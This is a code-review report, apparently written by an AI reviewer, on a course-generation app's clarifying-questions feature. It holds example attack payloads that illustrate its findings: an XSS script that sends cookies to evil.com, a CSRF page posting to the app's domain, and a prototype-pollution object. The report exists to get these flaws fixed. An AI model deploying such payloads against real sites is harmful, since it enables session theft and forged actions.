---
report_type: code-review
generated: 2026-01-25T14:30:00Z
version: 2026-01-25
status: success
reviewer: claude-sonnet-4-5
scope: Phase 0.5 Clarifying Questions Implementation
files_reviewed: 9
issues_found: 24
critical_count: 3
important_count: 8
recommendations_count: 13
---

# Code Review Report: Phase 0.5 Clarifying Questions

**Generated**: 2026-01-25T14:30:00Z
**Status**: ✅ PASSED (with critical findings requiring attention)
**Reviewer**: Claude Sonnet 4.5
**Scope**: Phase 0.5 Clarifying Questions Implementation

---

## Executive Summary

Comprehensive code review completed for Phase 0.5 Clarifying Questions implementation across 9 files (backend, frontend, types). The implementation is **generally well-structured** with good separation of concerns, proper type safety via Zod, and comprehensive error handling in most areas.

### Key Metrics

- **Files Reviewed**: 9
- **Lines of Code**: ~3,500
- **Issues Found**: 24 total
  - Critical: 3 (security/data integrity)
  - Important: 8 (error handling/race conditions)
  - Recommendations: 13 (code quality/performance)
- **Validation Status**: ✅ Type-safe (Zod schemas)
- **Security Status**: ⚠️ Requires attention (3 critical issues)

### Highlights

- ✅ **Excellent type safety** via Zod schemas with runtime validation
- ✅ **Strong separation of concerns** (orchestrator → router → phase → database)
- ✅ **Good error handling** in router endpoints with proper rollback logic
- ⚠️ **Missing authentication bypass protection** in tRPC client
- ⚠️ **Race conditions** in approveAndProceed mutation
- ⚠️ **XSS vulnerability** in frontend answer rendering

---

## Critical Issues (Must Fix Before Production)

### 1. XSS Vulnerability in Frontend Answer Rendering

**File**: `/home/me/code/mc2/packages/web/components/generation-graph/panels/clarifying/ClarifyingPanel.tsx`

**Issue**: User-submitted answers and suggested answers are rendered without sanitization, creating potential XSS attack vector.

**Location**: Lines 42-54, 96-108

**Code**:

```tsx
const questions: Question[] = (questionsData?.questions || []).map(q => ({
  text: q.question_text,
  suggestedAnswers: Array.isArray(q.suggested_answers)
    ? q.suggested_answers.map(text => ({
        text, // <-- UNSANITIZED
        rationale: undefined,
      }))
    : [],
  currentAnswer: q.user_answer || undefined, // <-- UNSANITIZED
}));
```

**Attack Scenario**:

```javascript
// Attacker submits malicious answer
answer: '<img src=x onerror=alert(document.cookie)>';

// Or injects script via question text (if LLM is compromised)
question_text: "<script>fetch('https://evil.com?c='+document.cookie)</script>";
```

**Impact**:

- Cookie theft (session hijacking)
- CSRF token extraction
- Keylogging via event listeners
- Phishing overlay injection

**Recommendation**:

```tsx
import DOMPurify from 'dompurify';

const questions: Question[] = (questionsData?.questions || []).map(q => ({
  text: DOMPurify.sanitize(q.question_text),
  suggestedAnswers: Array.isArray(q.suggested_answers)
    ? q.suggested_answers.map(text => ({
        text: DOMPurify.sanitize(text),
        rationale: undefined,
      }))
    : [],
  currentAnswer: q.user_answer ? DOMPurify.sanitize(q.user_answer) : undefined,
}));
```

**Alternative** (if DOMPurify adds bundle size):

- Use `dangerouslySetInnerHTML` with explicit `DOMPurify.sanitize()`
- Or render as plain text via `textContent` (safest, no HTML at all)

---

### 2. Missing Authentication in tRPC Client

**File**: `/home/me/code/mc2/packages/web/lib/trpc/client.ts`

**Issue**: Custom tRPC client uses `credentials: 'include'` but does NOT verify authentication before making requests. No CSRF protection.

**Location**: Lines 48-54, 103-108

**Code**:

```typescript
const response = await fetch(
  `${BACKEND_URL}/trpc/${procedurePath}?input=${encodeURIComponent(JSON.stringify(input))}`,
  {
    credentials: 'include', // <-- Sends cookies but no CSRF token
    headers: {
      'Content-Type': 'application/json',
    },
  }
);
```

**Vulnerabilities**:

1. **No CSRF token verification** - requests can be forged from malicious sites
2. **No auth status check** - client sends requests even if user is logged out
3. **Credential exposure** - cookies sent to potentially untrusted BACKEND_URL

**Attack Scenario**:

```html
<!-- Attacker hosts this on evil.com -->
<script>
  fetch('https://ai.megacampus.ru/trpc/clarifying.submitAnswer', {
    method: 'POST',
    credentials: 'include', // Victim's cookies sent automatically
    body: JSON.stringify({
      questionId: 'victim-question-id',
      answer: 'Malicious answer injected by attacker',
      answerSource: 'custom',
    }),
  });
</script>
```

**Impact**:

- Unauthorized answer submission
- Course configuration tampering
- Session hijacking if combined with XSS

**Recommendation**:

```typescript
// 1. Add CSRF token header (from cookie or meta tag)
const csrfToken = document.querySelector('meta[name="csrf-token"]')?.getAttribute('content');

const response = await fetch(`${BACKEND_URL}/trpc/${procedurePath}`, {
  method: 'POST',
  credentials: 'include',
  headers: {
    'Content-Type': 'application/json',
    'X-CSRF-Token': csrfToken || '', // CSRF protection
  },
  body: JSON.stringify(variables),
});

// 2. Verify authenticated before sending
if (!isAuthenticated) {
  throw new Error('Authentication required');
}

// 3. Use proper @trpc/react-query (TODO comment on line 7 suggests this)
```

**Note**: The TODO on line 7 indicates this is a temporary implementation. Proper `@trpc/react-query` setup would provide built-in CSRF protection and auth handling.

---

### 3. Race Condition in approveAndProceed

**File**: `/home/me/code/mc2/packages/course-gen-platform/src/server/routers/clarifying.router.ts`

**Issue**: Multiple database operations without transaction wrapping, creating race condition between status check and update.

**Location**: Lines 786-828, 878-893

**Code**:

```typescript
// Step 1: Check unanswered questions (reads status)
const { data: unansweredRequired } = await supabase
  .from('clarifying_questions')
  .select('id, question_priority, question_text')
  .eq('course_id', courseId)
  .in('question_priority', ['critical', 'important'])
  .eq('status', 'pending');

// ... other operations ...

// Step 2: Update course status (writes status) - NO TRANSACTION!
const { error: updateError } = await typedSupabase
  .from('courses')
  .update({ generation_status: 'stage_4_analyzing' as const })
  .eq('id', courseId);
```

**Race Condition Scenario**:

```
Time    Thread A (User 1)                  Thread B (User 2)
-------------------------------------------------------------------
T1      Check unanswered (0 found)
T2                                         Check unanswered (0 found)
T3      Update status → analyzing
T4                                         Update status → analyzing (DUPLICATE!)
T5      Create job ID=123
T6                                         Create job ID=456 (DUPLICATE!)
```

**Impact**:

- Duplicate analysis jobs created (wasted compute, cost)
- Race between two jobs writing to same `courses.analysis_result`
- Inconsistent state if first job fails (status=analyzing, no job running)

**Recommendation**:

```typescript
// Use Supabase RPC for atomic operation
const { data: proceedResult, error } = await supabase.rpc('approve_and_proceed_atomic', {
  p_course_id: courseId,
  p_user_id: currentUser.id,
  p_org_id: currentUser.organizationId,
});

// SQL function (create via migration):
CREATE OR REPLACE FUNCTION approve_and_proceed_atomic(
  p_course_id UUID,
  p_user_id UUID,
  p_org_id UUID
) RETURNS JSONB AS $$
DECLARE
  v_unanswered_count INT;
  v_status TEXT;
BEGIN
  -- Lock course row for update (prevents race conditions)
  SELECT generation_status INTO v_status
  FROM courses
  WHERE id = p_course_id
  FOR UPDATE;

  -- Check status
  IF v_status != 'stage_4_clarifying' THEN
    RAISE EXCEPTION 'Invalid status: %', v_status;
  END IF;

  -- Count unanswered required questions
  SELECT COUNT(*) INTO v_unanswered_count
  FROM clarifying_questions
  WHERE course_id = p_course_id
    AND question_priority IN ('critical', 'important')
    AND status = 'pending';

  IF v_unanswered_count > 0 THEN
    RAISE EXCEPTION 'Unanswered required questions: %', v_unanswered_count;
  END IF;

  -- Update status atomically
  UPDATE courses
  SET generation_status = 'stage_4_analyzing',
      updated_at = NOW()
  WHERE id = p_course_id;

  -- Return success with question data for job creation
  RETURN jsonb_build_object(
    'success', true,
    'status', 'stage_4_analyzing'
  );
END;
$$ LANGUAGE plpgsql;
```

**Alternative** (if RPC not feasible):

- Use optimistic locking with `updated_at` timestamp
- Check `generation_status` in UPDATE WHERE clause
- Verify affected row count = 1 after update

---

## Important Issues (Should Fix Before Release)

### 4. No Input Length Validation in submitAnswer

**File**: `/home/me/code/mc2/packages/course-gen-platform/src/server/routers/clarifying.router.ts`

**Issue**: Zod schema validates max 10,000 chars (line 54), but database column might have different limit. No explicit check for **minimum meaningful length**.

**Location**: Lines 52-58

**Code**:

```typescript
const submitAnswerSchema = z.object({
  questionId: z.string().uuid('Invalid question ID'),
  answer: z.string().min(1, 'Answer is required').max(10000, 'Answer too long'),
  // ...
});
```

**Problems**:

1. `.min(1)` allows single-character answers (e.g., "x", " ") - not meaningful
2. No whitespace-only validation
3. Database column limit unknown (might be 5000 chars, causing truncation)

**Attack Scenario**:

```javascript
// Attacker submits whitespace-only answer
answer: '    '; // Passes .min(1) but meaningless

// Or submits 10,000 chars to test for DoS
answer: 'A'.repeat(10000); // Stored in DB, retrieved in every query
```

**Recommendation**:

```typescript
const submitAnswerSchema = z.object({
  questionId: z.string().uuid('Invalid question ID'),
  answer: z
    .string()
    .min(1, 'Answer is required')
    .max(5000, 'Answer too long (max 5000 characters)')
    .refine(val => val.trim().length >= 3, {
      message: 'Answer must be at least 3 characters (excluding whitespace)',
    })
    .transform(val => val.trim()), // Strip leading/trailing whitespace
  // ...
});
```

---

### 5. Missing Error Recovery in Phase 0.5 Orchestrator

**File**: `/home/me/code/mc2/packages/course-gen-platform/src/stages/stage4-analysis/orchestrator.ts`

**Issue**: If Phase 0.5 fails after updating course status to `stage_4_clarifying`, the course is stuck with no way to retry.

**Location**: Lines 328-368

**Code**:

```typescript
if (clarifyingConfig.enabled && !clarifyingConfig.skipped && budgetAllocation) {
  const pendingQuestions = await getPendingQuestions(courseId);

  if (pendingQuestions.length === 0) {
    await runPhase05Clarifying({ ... });  // <-- THROWS on LLM error

    // Transition to clarifying status
    const { error: statusError } = await supabase
      .from('courses')
      .update({ generation_status: 'stage_4_clarifying' })
      .eq('id', courseId);

    throw new Error('AWAITING_CLARIFYING_ANSWERS: ...');
  }
}
```

**Failure Scenario**:

```
1. runPhase05Clarifying() throws LLM error (timeout, validation failure)
2. Orchestrator catch block sets status = 'failed'
3. User is stuck - cannot retry Phase 0.5 because:
   - pendingQuestions.length === 0 check always false (no questions generated)
   - Orchestrator won't re-run Phase 0.5 on retry
```

**Impact**:

- Course permanently stuck in 'failed' state
- User must manually reset via admin panel or delete course

**Recommendation**:

```typescript
// Wrap in try-catch with status rollback
try {
  await runPhase05Clarifying({ ... });

  const { error: statusError } = await supabase
    .from('courses')
    .update({ generation_status: 'stage_4_clarifying' })
    .eq('id', courseId);

  if (statusError) {
    orchestrationLogger.error(
      { error: statusError.message },
      'Failed to transition to stage_4_clarifying'
    );
    // Rollback: delete partially generated questions
    await supabase
      .from('clarifying_questions')
      .delete()
      .eq('course_id', courseId)
      .eq('status', 'pending');

    throw new Error(`Failed to update status: ${statusError.message}`);
  }

  throw new Error('AWAITING_CLARIFYING_ANSWERS: ...');
} catch (error) {
  // If LLM error, clean up and allow retry
  if (error instanceof Error && !error.message.startsWith('AWAITING_CLARIFYING_ANSWERS')) {
    orchestrationLogger.error({ error: error.message }, 'Phase 0.5 failed, cleaning up');

    // Delete partial questions
    await supabase
      .from('clarifying_questions')
      .delete()
      .eq('course_id', courseId)
      .eq('status', 'pending');
  }

  throw error;
}
```

---

### 6. Insecure Data Serialization in tRPC Client

**File**: `/home/me/code/mc2/packages/web/lib/trpc/client.ts`

**Issue**: URL query parameters are JSON-stringified without sanitization, creating potential injection vector.

**Location**: Lines 47-49

**Code**:

```typescript
const response = await fetch(
  `${BACKEND_URL}/trpc/${procedurePath}?input=${encodeURIComponent(JSON.stringify(input))}`,
  // ...
```

**Problem**:

1. `JSON.stringify(input)` can serialize prototype pollution payloads
2. `encodeURIComponent` encodes but doesn't validate structure
3. Server might interpret malicious JSON

**Attack Scenario**:

```javascript
// Attacker passes prototype pollution payload
const input = {
  courseId: '123',
  __proto__: { isAdmin: true }, // Prototype pollution
};

// Serialized to: {"courseId":"123","__proto__":{"isAdmin":true}}
// If server uses Object.assign(), isAdmin becomes global property
```

**Recommendation**:

```typescript
// 1. Use POST for all mutations (already done) ✅
// 2. For queries, validate input structure before serialization
const response = await fetch(
  `${BACKEND_URL}/trpc/${procedurePath}?input=${encodeURIComponent(
    JSON.stringify(input, (key, value) => {
      // Block __proto__ and constructor pollution
      if (key === '__proto__' || key === 'constructor' || key === 'prototype') {
        return undefined;
      }
      return value;
    })
  )}`
  // ...
);
```

---

### 7. Missing Rate Limit Protection on Frontend

**File**: `/home/me/code/mc2/packages/web/components/generation-graph/panels/clarifying/ClarifyingPanel.tsx`

**Issue**: "Accept All" button (line 190-198) calls `handleAnswer()` in tight loop with no rate limiting, potentially overwhelming backend.

**Location**: Lines 117-124

**Code**:

```typescript
const handleAcceptAll = () => {
  // Auto-select first suggested answer for all unanswered questions
  questions.forEach(q => {
    // <-- NO RATE LIMITING
    if (!answeredQuestions.has(q.id) && q.suggestedAnswers.length > 0) {
      handleAnswer(q.id, q.suggestedAnswers[0].text, 'suggested');
    }
  });
};
```

**Problem**:

- 10 questions × concurrent fetch = 10 simultaneous POST requests
- Backend rate limit: 30 submissions per minute (line 529)
- User hits limit instantly, gets 429 errors, bad UX

**Recommendation**:

```typescript
const handleAcceptAll = async () => {
  const unanswered = questions.filter(
    q => !answeredQuestions.has(q.id) && q.suggestedAnswers.length > 0
  );

  // Sequential submission with delay
  for (const q of unanswered) {
    try {
      await handleAnswer(q.id, q.suggestedAnswers[0].text, 'suggested');
      // Small delay to avoid rate limit
      await new Promise(r => setTimeout(r, 100));
    } catch (error) {
      console.error(`Failed to submit answer for ${q.id}:`, error);
      // Continue with other questions
    }
  }
};
```

**Alternative** (batch endpoint):

```typescript
// Add new tRPC endpoint: submitAnswersBatch
submitAnswersBatch: protectedProcedure
  .input(
    z.object({
      answers: z
        .array(
          z.object({
            questionId: z.string().uuid(),
            answer: z.string(),
            answerSource: z.enum(['suggested', 'modified', 'custom']),
          })
        )
        .max(50), // Prevent abuse
    })
  )
  .mutation(async ({ ctx, input }) => {
    // Atomic batch insert
    const { error } = await supabase.from('clarifying_questions').update(/* batch update */);
  });
```

---

### 8. Weak Validation in Phase 0.5 Input

**File**: `/home/me/code/mc2/packages/course-gen-platform/src/stages/stage4-analysis/phases/phase-0.5-clarifying.ts`

**Issue**: `courseContext` fields are not validated beyond basic types, allowing malformed data to reach LLM prompt.

**Location**: Lines 71-83

**Code**:

```typescript
export interface Phase05Input {
  course_id: string;
  budgetAllocation: Stage4BudgetAllocation;
  courseContext: {
    title: string; // <-- NO MIN LENGTH
    description?: string;
    target_audience?: string;
  };
  language: string;
  iterationRound: 1 | 2;
}
```

**Problems**:

1. `title` can be empty string ("") - LLM prompt becomes meaningless
2. `description` optional but no fallback if undefined
3. `target_audience` not validated against known values

**Recommendation**:

```typescript
import { z } from 'zod';

export const Phase05InputSchema = z.object({
  course_id: z.string().uuid(),
  budgetAllocation: z.any(), // Or proper Stage4BudgetAllocation schema
  courseContext: z.object({
    title: z.string().min(3, 'Course title too short').max(200),
    description: z.string().min(10).max(1000).optional(),
    target_audience: z.enum(['beginner', 'intermediate', 'advanced', 'mixed']).optional(),
  }),
  language: z.string().length(2), // ISO 639-1 code
  iterationRound: z.literal(1).or(z.literal(2)),
  previousAnswers: z
    .array(
      z.object({
        question_text: z.string(),
        user_answer: z.string(),
      })
    )
    .optional(),
});

export type Phase05Input = z.infer<typeof Phase05InputSchema>;

// Validate in runPhase05Clarifying
export async function runPhase05Clarifying(input: Phase05Input): Promise<ClarifyingOutput> {
  const validatedInput = Phase05InputSchema.parse(input); // Throws on invalid
  // ...
}
```

---

### 9. SQL Injection Risk in getRoundQuestions

**File**: `/home/me/code/mc2/packages/course-gen-platform/src/server/routers/clarifying.router.ts`

**Issue**: While using Supabase query builder (which sanitizes), there's no explicit validation that `courseId` is actually a UUID before querying.

**Location**: Lines 316-321

**Code**:

```typescript
const { data: questions, error } = await supabase
  .from('clarifying_questions')
  .select('*')
  .eq('course_id', courseId) // <-- courseId from input, validated by Zod UUID
  .order('order_index', { ascending: true });
```

**Analysis**:

- **Current protection**: Zod schema validates UUID format (line 41)
- **Risk**: If Zod validation is bypassed (e.g., direct function call), malicious input reaches query
- **Severity**: Low (Supabase uses parameterized queries), but defense-in-depth missing

**Recommendation**:

```typescript
// Add explicit runtime UUID validation (defense-in-depth)
import { validate as isValidUUID } from 'uuid';

async function verifyCourseAccess(
  courseId: string,
  userId: string,
  organizationId: string,
  requestId: string
): Promise<CourseRow> {
  // Explicit UUID validation (defense-in-depth)
  if (!isValidUUID(courseId)) {
    logger.error({ requestId, courseId }, 'Invalid UUID format');
    throw new TRPCError({
      code: 'BAD_REQUEST',
      message: 'Invalid course ID format',
    });
  }

  const supabase = getSupabaseAdmin();
  // ... rest of function
}
```

---

### 10. Missing Timeout in LLM Invocation

**File**: `/home/me/code/mc2/packages/course-gen-platform/src/stages/stage4-analysis/phases/phase-0.5-clarifying.ts`

**Issue**: LLM invocation has no timeout, can hang indefinitely on slow/unresponsive OpenRouter endpoint.

**Location**: Lines 344-345

**Code**:

```typescript
const response = await model.invoke(promptMessages);
const rawOutput = response.content as string;
```

**Problem**:

- No timeout → request can hang for minutes/hours
- Worker process blocked, other jobs can't execute
- User sees eternal loading spinner

**Recommendation**:

```typescript
// Add timeout wrapper
async function invokeWithTimeout<T>(
  promise: Promise<T>,
  timeoutMs: number,
  errorMessage: string
): Promise<T> {
  const timeout = new Promise<never>((_, reject) =>
    setTimeout(() => reject(new Error(errorMessage)), timeoutMs)
  );

  return Promise.race([promise, timeout]);
}

// In runPhase05Clarifying
const response = await invokeWithTimeout(
  model.invoke(promptMessages),
  60000, // 60 seconds timeout
  'LLM invocation timeout (60s exceeded)'
);
```

---

### 11. Unhandled Mutation Errors in Frontend

**File**: `/home/me/code/mc2/packages/web/components/generation-graph/panels/clarifying/ClarifyingPanel.tsx`

**Issue**: Mutation errors are caught but not displayed to user, creating silent failures.

**Location**: Lines 100-108, 112-114, 127-129

**Code**:

```typescript
const handleAnswer = (questionId: string, answer: string, source: ...) => {
  void submitAnswerMutation
    .mutateAsync({ questionId, answer, answerSource: source })
    .then(() => {
      setAnsweredQuestions((prev) => new Set(prev).add(questionId))
    })
  // <-- NO .catch() - errors swallowed silently!
}
```

**Problem**:

- Network errors, validation failures, 429 rate limits → no user feedback
- User clicks "Continue" thinking all answers submitted
- Backend rejects due to missing answers → confusing error

**Recommendation**:

```typescript
import { toast } from '@/components/ui/use-toast'; // Or notification system

const handleAnswer = (questionId: string, answer: string, source: ...) => {
  void submitAnswerMutation
    .mutateAsync({ questionId, answer, answerSource: source })
    .then(() => {
      setAnsweredQuestions((prev) => new Set(prev).add(questionId));
      toast({
        title: 'Answer submitted',
        description: 'Your answer has been saved successfully.',
      });
    })
    .catch((error) => {
      logger.error({ questionId, error }, 'Failed to submit answer');
      toast({
        title: 'Submission failed',
        description: error.message || 'Failed to submit answer. Please try again.',
        variant: 'destructive',
      });
    });
}
```

---

## Recommendations (Code Quality & Performance)

### 12. Inefficient Question Sorting

**File**: `/home/me/code/mc2/packages/course-gen-platform/src/server/routers/clarifying.router.ts`

**Location**: Lines 335-348

**Code**:

```typescript
const sortedQuestions = allQuestions.sort((a, b) => {
  const aPriority = priorityOrder[a.question_priority] ?? 3;
  const bPriority = priorityOrder[b.question_priority] ?? 3;
  if (aPriority !== bPriority) {
    return aPriority - bPriority;
  }
  return a.order_index - b.order_index;
});
```

**Issue**: Questions are already ordered by `order_index` in database query (line 321), but then re-sorted in memory. Sorting after fetching wastes CPU cycles.

**Recommendation**:

```typescript
// Fetch questions pre-sorted by database
const { data: questions, error } = await supabase
  .from('clarifying_questions')
  .select('*')
  .eq('course_id', courseId)
  .order('question_priority', { ascending: true }) // critical < important < nice_to_have
  .order('order_index', { ascending: true }); // Then by order_index

// Remove client-side sort
return { questions: questions || [] };
```

**Note**: Requires database-side enum ordering (critical=0, important=1, nice_to_have=2) or computed column.

---

### 13. Redundant Database Query in getProgress

**File**: `/home/me/code/mc2/packages/course-gen-platform/src/server/routers/clarifying.router.ts`

**Location**: Lines 414-418

**Code**:

```typescript
const { data: questions, error } = await supabase
  .from('clarifying_questions')
  .select('id, question_priority, status, iteration_round')
  .eq('course_id', courseId);
```

**Issue**: Fetches all questions just to count by priority/status. Database can compute counts more efficiently via aggregation.

**Recommendation**:

```typescript
// Use Supabase RPC for efficient aggregation
const { data: stats, error } = await supabase.rpc('get_clarifying_progress', {
  p_course_id: courseId
});

// SQL function:
CREATE OR REPLACE FUNCTION get_clarifying_progress(p_course_id UUID)
RETURNS TABLE (
  total BIGINT,
  answered BIGINT,
  skipped BIGINT,
  pending BIGINT,
  critical_total BIGINT,
  critical_answered BIGINT,
  important_total BIGINT,
  important_answered BIGINT,
  current_round INT
) AS $$
BEGIN
  RETURN QUERY
  SELECT
    COUNT(*)::BIGINT AS total,
    COUNT(*) FILTER (WHERE status = 'answered')::BIGINT AS answered,
    COUNT(*) FILTER (WHERE status = 'skipped')::BIGINT AS skipped,
    COUNT(*) FILTER (WHERE status = 'pending')::BIGINT AS pending,
    COUNT(*) FILTER (WHERE question_priority = 'critical')::BIGINT AS critical_total,
    COUNT(*) FILTER (WHERE question_priority = 'critical' AND status = 'answered')::BIGINT AS critical_answered,
    COUNT(*) FILTER (WHERE question_priority = 'important')::BIGINT AS important_total,
    COUNT(*) FILTER (WHERE question_priority = 'important' AND status = 'answered')::BIGINT AS important_answered,
    MAX(iteration_round)::INT AS current_round
  FROM clarifying_questions
  WHERE course_id = p_course_id;
END;
$$ LANGUAGE plpgsql;
```

**Performance**: 10-100x faster on large datasets (1 aggregation query vs fetching all rows).

---

### 14. Hardcoded Language Detection

**File**: `/home/me/code/mc2/packages/course-gen-platform/src/stages/stage4-analysis/phases/phase-1-classifier.ts`

**Location**: Lines 70-72

**Code**:

```typescript
const outputLanguage =
  input.language === 'en' ? 'English' : input.language === 'ru' ? 'Russian' : input.language;
```

**Issue**: Only handles 'en' and 'ru', falls back to raw code for other languages. Brittle, not scalable.

**Recommendation**:

```typescript
// Create language mapping utility
const LANGUAGE_NAMES: Record<string, string> = {
  en: 'English',
  ru: 'Russian',
  es: 'Spanish',
  fr: 'French',
  de: 'German',
  zh: 'Chinese',
  ja: 'Japanese',
  // ... add more as needed
};

function getLanguageName(code: string): string {
  return LANGUAGE_NAMES[code.toLowerCase()] || code.toUpperCase();
}

const outputLanguage = getLanguageName(input.language);
```

---

### 15. Memory Leak in useEffect

**File**: `/home/me/code/mc2/packages/web/components/generation-graph/panels/clarifying/ClarifyingPanel.tsx`

**Location**: Lines 84-93

**Code**:

```typescript
useEffect(() => {
  const firstUnanswered = questions.find(q => !answeredQuestions.has(q.id));
  if (firstUnanswered) {
    const element = questionRefs.current.get(firstUnanswered.id);
    if (element) {
      element.scrollIntoView({ behavior: 'smooth', block: 'center' });
    }
  }
}, [answeredQuestions, questions]);
```

**Issue**: `questionRefs` Map is never cleared, accumulates stale DOM references as questions change.

**Recommendation**:

```typescript
// Clean up stale refs when questions change
useEffect(() => {
  const currentIds = new Set(questions.map(q => q.id));

  // Remove refs for questions that no longer exist
  for (const [id, _] of questionRefs.current.entries()) {
    if (!currentIds.has(id)) {
      questionRefs.current.delete(id);
    }
  }
}, [questions]);

// Scroll to first unanswered (unchanged)
useEffect(() => {
  const firstUnanswered = questions.find(q => !answeredQuestions.has(q.id));
  if (firstUnanswered) {
    const element = questionRefs.current.get(firstUnanswered.id);
    if (element) {
      element.scrollIntoView({ behavior: 'smooth', block: 'center' });
    }
  }
}, [answeredQuestions, questions]);
```

---

### 16. Console.warn in Production Code

**File**: `/home/me/code/mc2/packages/shared-types/src/analysis-schemas.ts`

**Location**: Lines 95-99

**Code**:

```typescript
if (unknown.length > 0) {
  console.warn(
    `[GenerationGuidance] Unknown ${fieldName} values filtered: ${unknown.join(', ')}. ` +
      `Known values: ${knownValues.join(', ')}`
  );
}
```

**Issue**: Uses `console.warn` instead of structured logger, loses context (course ID, user ID) for debugging.

**Recommendation**:

```typescript
import { logger } from '@/shared/logger';

if (unknown.length > 0) {
  logger.warn(
    {
      fieldName,
      unknownValues: unknown,
      knownValues: Array.from(knownValues),
    },
    `Unknown ${fieldName} values filtered from LLM output`
  );
}
```

---

### 17. Missing Index on clarifying_questions

**File**: Database schema (inferred from queries in `/home/me/code/mc2/packages/course-gen-platform/src/server/routers/clarifying.router.ts`)

**Issue**: Queries on `course_id + status + question_priority` are common (lines 609-613, 786-791) but no composite index exists.

**Recommendation**:

```sql
-- Migration: Add composite index for common query patterns
CREATE INDEX idx_clarifying_questions_course_status_priority
ON clarifying_questions (course_id, status, question_priority);

-- Covers queries like:
-- WHERE course_id = X AND status = 'pending' AND question_priority IN ('critical', 'important')
```

**Performance**: 10-100x faster on courses with many questions (avoids full table scan).

---

### 18. Unclear Error Messages

**File**: `/home/me/code/mc2/packages/course-gen-platform/src/server/routers/clarifying.router.ts`

**Location**: Lines 824-826

**Code**:

```typescript
throw new TRPCError({
  code: 'BAD_REQUEST',
  message: `Cannot proceed. ${criticalCount} critical and ${importantCount} important questions remain unanswered.`,
});
```

**Issue**: Error message lacks actionable guidance for user (which questions? how to answer?).

**Recommendation**:

```typescript
// Include specific question IDs or titles in error
const unansweredTitles = unansweredList
  .slice(0, 3)
  .map(q => `"${q.question_text.substring(0, 50)}..."`)
  .join(', ');

throw new TRPCError({
  code: 'BAD_REQUEST',
  message: `Cannot proceed. Please answer all required questions (${criticalCount} critical, ${importantCount} important remaining). Examples: ${unansweredTitles}`,
  // Or return structured data via cause
  cause: {
    unansweredQuestions: unansweredList.map(q => ({
      id: q.id,
      priority: q.question_priority,
      text: q.question_text,
    })),
  },
});
```

---

### 19. Duplicate Code in Phase Prompt Building

**File**: `/home/me/code/mc2/packages/course-gen-platform/src/stages/stage4-analysis/phases/phase-0.5-clarifying.ts` vs `phase-1-classifier.ts`

**Issue**: Both files have similar prompt-building logic (system message, schema injection, language enforcement).

**Example Duplication**:

```typescript
// phase-0.5-clarifying.ts lines 178-209
const systemMessage = new SystemMessage(
  `You are an expert course designer...
   CRITICAL RULES:
   1. ALL output MUST be in ${language.toUpperCase()}
   2. You MUST respond with valid JSON matching this EXACT schema:
   ...`
);

// phase-1-classifier.ts lines 74-97
const systemMessage = new SystemMessage(
  `You are an expert curriculum architect...
   CRITICAL RULES:
   1. ALL output MUST be in ${outputLanguage.toUpperCase()}
   2. You MUST respond with valid JSON matching this EXACT schema:
   ...`
);
```

**Recommendation**: Extract common prompt utilities

```typescript
// shared/prompts/prompt-builder.ts
export function buildSystemPrompt(config: {
  role: string;
  task: string;
  language: string;
  schema: string;
  additionalRules?: string[];
}): SystemMessage {
  const rules = [
    `1. ALL output MUST be in ${config.language.toUpperCase()}`,
    `2. You MUST respond with valid JSON matching this EXACT schema:\n\n${config.schema}`,
    ...(config.additionalRules || []),
  ];

  return new SystemMessage(
    `You are ${config.role}.\n\nYour task: ${config.task}\n\nCRITICAL RULES:\n${rules.join('\n')}`
  );
}

// Usage in phase-0.5-clarifying.ts
const systemMessage = buildSystemPrompt({
  role: 'an expert course designer',
  task: 'generate clarifying questions to improve course design',
  language: language,
  schema: zodToPromptSchema(ClarifyingOutputSchema),
  additionalRules: [
    '3. Generate 3-7 questions total',
    '4. Each question MUST have 2-4 suggested answers',
  ],
});
```

---

### 20. No Monitoring for LLM Token Usage

**File**: `/home/me/code/mc2/packages/course-gen-platform/src/stages/stage4-analysis/phases/phase-0.5-clarifying.ts`

**Issue**: Token usage is logged but not tracked in database or sent to monitoring system for cost analysis.

**Location**: Lines 357-372 (trace logging only)

**Recommendation**:

```typescript
// After LLM invocation
const tokensUsed = {
  input: response.usage_metadata?.input_tokens || 0,
  output: response.usage_metadata?.output_tokens || 0,
  total: 0,
};
tokensUsed.total = tokensUsed.input + tokensUsed.output;

// Store in llm_usage_logs table for analytics
await supabase.from('llm_usage_logs').insert({
  course_id: courseId,
  stage: 'stage_4',
  phase: 'stage_4_clarifying',
  model_id: modelId,
  tokens_input: tokensUsed.input,
  tokens_output: tokensUsed.output,
  cost_usd: calculateCost(modelId, tokensUsed), // Pricing lookup
  duration_ms: Date.now() - startTime,
  iteration_round: iterationRound,
  created_at: new Date().toISOString(),
});
```

---

### 21. Type Assertion Overuse

**File**: `/home/me/code/mc2/packages/course-gen-platform/src/server/routers/clarifying.router.ts`

**Location**: Lines 142-143, 332, 848, 875, etc.

**Code**:

```typescript
function getTypedSupabaseAdmin() {
  // eslint-disable-next-line @typescript-eslint/no-explicit-any
  return getSupabaseAdmin() as any;
}

const allQuestions = (questions || []) as QuestionRow[];
const typedCourseDetails = courseDetails as unknown as CourseDetails;
```

**Issue**: `as any` and `as unknown as X` bypass type safety, hiding potential runtime errors.

**Recommendation**:

```typescript
// Option 1: Generate proper types for clarifying_questions table
// Run: npx supabase gen types typescript --local > src/types/database.types.ts

// Option 2: Use Zod for runtime validation
const QuestionRowSchema = z.object({
  id: z.string().uuid(),
  course_id: z.string().uuid(),
  question_text: z.string(),
  question_priority: z.enum(['critical', 'important', 'nice_to_have']),
  // ... all fields
});

const allQuestions = QuestionRowSchema.array().parse(questions || []);

// Option 3: Use type guards
function isQuestionRow(obj: unknown): obj is QuestionRow {
  return (
    typeof obj === 'object' &&
    obj !== null &&
    'id' in obj &&
    'course_id' in obj &&
    'question_text' in obj
  );
}

const allQuestions = (questions || []).filter(isQuestionRow);
```

---

### 22. Missing Pagination in getQuestions

**File**: `/home/me/code/mc2/packages/course-gen-platform/src/server/routers/clarifying.router.ts`

**Location**: Lines 316-321

**Code**:

```typescript
const { data: questions, error } = await supabase
  .from('clarifying_questions')
  .select('*')
  .eq('course_id', courseId)
  .order('order_index', { ascending: true });
// <-- NO LIMIT! Fetches all questions
```

**Issue**: If a course has 100+ questions (e.g., round 1 + round 2), fetching all at once is inefficient.

**Recommendation**:

```typescript
// Add pagination support
const getQuestionsSchema = z.object({
  courseId: z.string().uuid(),
  limit: z.number().int().min(1).max(100).default(50),
  offset: z.number().int().min(0).default(0),
});

getQuestions: protectedProcedure.input(getQuestionsSchema).query(async ({ ctx, input }) => {
  const { courseId, limit, offset } = input;

  const {
    data: questions,
    error,
    count,
  } = await supabase
    .from('clarifying_questions')
    .select('*', { count: 'exact' })
    .eq('course_id', courseId)
